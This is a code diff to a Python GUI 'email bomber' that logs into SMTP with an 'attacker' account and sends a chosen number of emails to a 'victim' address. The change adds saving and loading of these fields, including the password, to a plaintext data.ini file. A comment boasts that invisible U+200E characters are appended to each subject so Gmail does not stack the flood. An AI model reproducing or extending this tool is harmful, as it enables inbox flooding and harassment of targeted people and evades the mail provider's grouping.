@@ -1,4 +1,6 @@
 import binascii
+import configparser
+from genericpath import exists
 import smtplib
 from email.message import EmailMessage
 from res.icon import runtime_icon
@@ -104,14 +106,50 @@ def create_gui() -> tk.Tk:
 def on_closing(iconfile_path: str):
     try:
         os.remove(iconfile_path)
-    except Exception as e:
-        print(e)
+    except Exception:
+        pass
     exit(0)
 
 def save_fields() -> None:
+    config = configparser.ConfigParser()
+    config['Default'] = {
+        'attacker_name': txt_attacker_name.get('1.0', 'end-1c'),
+        'attacker_address': txt_attacker_address.get('1.0', 'end-1c'),
+        'attacker_password': txt_attacker_password.get(),
+        'victim_adress': txt_victim_address.get('1.0', 'end-1c'),
+        'email_amount': txt_email_amount.get('1.0', 'end-1c'),
+        'email_subject': txt_email_subject.get('1.0', 'end-1c'),
+        'email_body': txt_email_body.get('1.0', 'end-1c')
+    }
+    
+    with open('data.ini', 'w+') as configfile:
+        config.write(configfile)
+        
     print_text('> Saved all fields')
 
 def load_fields() -> None:
+    if not exists('data.ini'):
+        print_text('> There is no data to load', 'yellow')
+        return
+    
+    config = configparser.ConfigParser()
+    config.read('data.ini')
+    
+    txt_attacker_name.delete('1.0', 'end')
+    txt_attacker_name.insert('end', config['Default']['attacker_name'])
+    txt_attacker_address.delete('1.0', 'end')
+    txt_attacker_address.insert('end', config['Default']['attacker_address'])
+    txt_attacker_password.delete(0, 'end')
+    txt_attacker_password.insert(0, config['Default']['attacker_password'])
+    txt_victim_address.delete('1.0', 'end')
+    txt_victim_address.insert('end', config['Default']['victim_adress'])
+    txt_email_amount.delete('1.0', 'end')
+    txt_email_amount.insert('end', config['Default']['email_amount'])
+    txt_email_subject.delete('1.0', 'end')
+    txt_email_subject.insert('end', config['Default']['email_subject'])
+    txt_email_body.delete('1.0', 'end')
+    txt_email_body.insert('end', config['Default']['email_body'])
+        
     print_text('> Loaded all fields')
 
 def print_text(text: str, tag_color: str = 'white') -> None:
@@ -128,7 +166,7 @@ def create_message(i: int) -> EmailMessage:
     
     # Create email
     msg = EmailMessage()
-    msg['Subject'] = txt_email_subject.get('1.0', 'end-1c') + (u'\u200e' * i)
+    msg['Subject'] = txt_email_subject.get('1.0', 'end-1c') + (u'\u200e' * i) # add to subject so gmail does not stack the emails with \u200e being an invisible char >:)
     msg['From'] = f'{txt_attacker_name.get("1.0", "end-1c")} <{txt_attacker_address.get("1.0", "end-1c")}>'
     msg['To'] = txt_victim_address.get('1.0', 'end-1c')
     msg.set_content(txt_email_body.get('1.0', 'end-1c'))
@@ -145,7 +183,7 @@ def server_login() -> smtplib.SMTP:
     
     # Try to login
     try:
-        server.login(txt_attacker_address.get("1.0", "end-1c"), txt_attacker_password.get("1.0", "end-1c"))
+        server.login(txt_attacker_address.get("1.0", "end-1c"), txt_attacker_password.get())
     except smtplib.SMTPAuthenticationError:
         return None
     
@@ -154,13 +192,13 @@ def server_login() -> smtplib.SMTP:
 def send_emails() -> None:
     email_server = server_login()
     if not email_server:
-        print_text('> The password doesn\'t match the email or you didn\'t setup your account correctly. \nCheck this video for help: https://youtu.be/g_j6ILT-X0k', 'red')
+        print_text('> The password doesn\'t match the email or you didn\'t setup your account correctly. \n> Check this video for help: https://youtu.be/g_j6ILT-X0k', 'red')
         return
     
     for i in range(int(txt_email_amount.get('1.0', 'end-1c'))):
         email_message = create_message(i)
         email_server.send_message(email_message)
-        print_text(f'> Sent email number {i + 1}', 'white')
+        print_text(f'> Sent email number {i + 1}')
     
     email_server.quit()
     print_text('> Emails have been sent successfully', 'green')
